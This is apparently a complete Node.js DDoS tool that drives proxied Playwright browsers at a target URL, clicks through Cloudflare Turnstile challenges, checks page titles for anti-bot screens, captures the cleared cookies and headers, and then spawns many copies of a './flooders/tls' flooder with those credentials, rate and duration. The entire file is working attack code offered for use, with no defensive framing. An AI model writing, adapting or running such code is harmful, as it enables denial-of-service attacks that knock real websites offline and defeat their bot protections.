/* 

*/

process.on('uncaughtException', function (er) {
  console.error(er)
});
process.on('unhandledRejection', function (er) {
  console.error(er)
});


const fs = require('fs');
const colors = require('colors');
const { chromium } = require('playwright-extra');
const { spawn } = require('child_process');


const EventEmitter = require('events');
const emitter = new EventEmitter();
process.setMaxListeners(0);


const browsersT = process.argv[2];
const proxyfileT = process.argv[3];
const rateT = process.argv[4];
const timeT = process.argv[5];
const urlT = process.argv[6];



function log(string) {
  const d = new Date();
  const hours = d.getHours().toString().padStart(2, '0');
  const minutes = d.getMinutes().toString().padStart(2, '0');
  const seconds = d.getSeconds().toString().padStart(2, '0');
  const formattedTime = `${hours}:${minutes}:${seconds}`;
  console.log(`[${formattedTime.white}] ${string}`);
}

if (process.argv.length < 6) {
  console.log('');
  console.log(`•`.gray, `Browser`.brightBlue, `#ID1`.red);
  console.log('');
  console.log(colors.red('Usage:') + ' ./browser <browsers> <proxyfile> <rate> <time> <url>');
  console.log('');
  console.log('');
  process.exit(1);
}


fs.readFile(proxyfileT, 'utf-8', async (err, data) => {
  if (err) {
    console.error('Error reading proxy:', err);
    return;
  }

  const proxies = data.trim().split("\n");

  console.clear();
  console.log('Start emulation');
  log(` ${colors.brightBlue('•')} Browsers: ${browsersT}`);
  log(` ${colors.brightBlue('•')} Proxyfile: ${fs.readFileSync(proxyfileT, 'utf-8').toString().replace(/\r/g, '').split('\n').length} proxies.`);
  log(` ${colors.brightBlue('•')} Rate: ${rateT}`);
  log(` ${colors.brightBlue('•')} Time: ${timeT}`);
  log(` ${colors.brightBlue('•')} URL: ${urlT}`);

  let currentBrowser = 0;
  const interval = setInterval(() => {
    if (currentBrowser < browsersT) {
      run(proxies, rateT, timeT, urlT).catch((error) => {});
      currentBrowser++;
    } else {
      clearInterval(interval);
    }
  }, 1000);

  setTimeout(function() {
    console.clear();
    log(` (` + `X`.red + `)` + ` ` + ` Time has passed: `.brightBlue + `${timeT} seconds`);
    process.exit(-1);
  }, timeT * 1000);
});

async function run(proxies, rateT, timeT, urlT) {
  const proxy = getProxy(proxies);
  await launchBrowser(proxy, rateT, timeT, urlT);
  run(proxies, rateT, timeT, urlT);
}

function getProxy(proxies) {
  const index = Math.floor(Math.random() * proxies.length);
  return proxies[index];
}

const launchBrowser = async (proxy, rateT, timeT, urlT) => {
  const launchOptions = {
    headless: false,
    ignoreHTTPSErrors: true,
    javaScriptEnabled: true,
    deviceScaleFactor: 1,
    proxy: { server: 'http://' + proxy },
    permissions: ['camera', 'microphone'],
    args: [
      '--headless=new',
      '--disable-blink-features=AutomationControlled',
      '--disable-features=IsolateOrigins,site-per-process',
      '--use-fake-device-for-media-stream',
      '--use-fake-ui-for-media-stream',
      '--no-sandbox',
      '--enable-experimental-web-platform-features',
      '--disable-dev-shm-usage',
      '--disable-software-rastrizier',
      '--enable-features=NetworkService'
    ],
    ignoreDefaultArgs: ['--enable-automation'],
  };

  const browser = await chromium.launch(launchOptions);
  const context = await browser.newContext({ viewport: { width: 1920, height: 1080 } });
  const page = await context.newPage();
  await page.setViewportSize({ width: 1920, height: 1080 });
  await page.emulateMedia({ colorScheme: 'dark' });

  console.log("Session started");

  try {
    const response = await page.goto(urlT, { waitUntil: 'domcontentloaded', timeout: 10000 });
    await page.waitForTimeout(15000);

    const cloudflareButton = await page.evaluate(() => {
      const button = document.querySelector('#turnstile-wrapper');
      if (button) {
        const { x, y, width, height } = button.getBoundingClientRect();
        return { x: x + width / 5, y: y + height / 2 };
      } else {
        return false;
      }
    });

    if (cloudflareButton !== false) {
      log('Cloudflare CAPTCHA Detect');
      await page.hover('#turnstile-wrapper');
      await page.waitForTimeout(2500);
      await page.mouse.click(cloudflareButton.x, cloudflareButton.y);
      log('Cloudflare CAPTCHA bypassed');
      await page.waitForTimeout(2500);
    }

    const title = await page.title();
    const blockedKeywords = ['Just a moment...', 'Checking your browser...', 'Access denied', 'DDOS-GUARD', 'Attention', 'VentryShield'];
    if (blockedKeywords.some(keyword => title.toLowerCase().includes(keyword.toLowerCase()))) {
      await browser.close();
    }

    const headers = await response.request().allHeaders();
    const cookies = (await page.context().cookies(page.url())).map((c) => `${c.name}=${c.value}`).join("; ");
    for(let x = 0; x < 150; x++) {
    runFlood(cookies, proxy, headers, rateT, timeT, urlT);
    }
    console.log(`* START`);
    console.log(`•`.gray, `Title: `.brightBlue, title);
    console.log(`•`.gray, `Cookies: `.brightBlue, cookies);

  } catch (error) {
  } finally {
    await browser.close();
  }
};

function runFlood(cookies, proxy, headers, rateT, timeT, urlT) {
  delete headers[':path'];
  delete headers[':method'];
  delete headers[':scheme'];
  delete headers[':authority'];
  const headerEntries = Object.entries(headers);

  const args_start = [
    "-r", rateT,
    "-d", timeT,
    "-c", '102',
    ...headerEntries.flatMap((entry) => ["-h", `${entry[0]}@${entry[1]}`]),
    "-h",
    `cookie@${cookies.length > 0 ? cookies : "@"}`,
    "-p", proxy.trim(),
    "-u", urlT,
  ];
  starts = spawn('./flooders/tls', args_start, {
    stdio: 'inherit',
    detached: false,
  });
}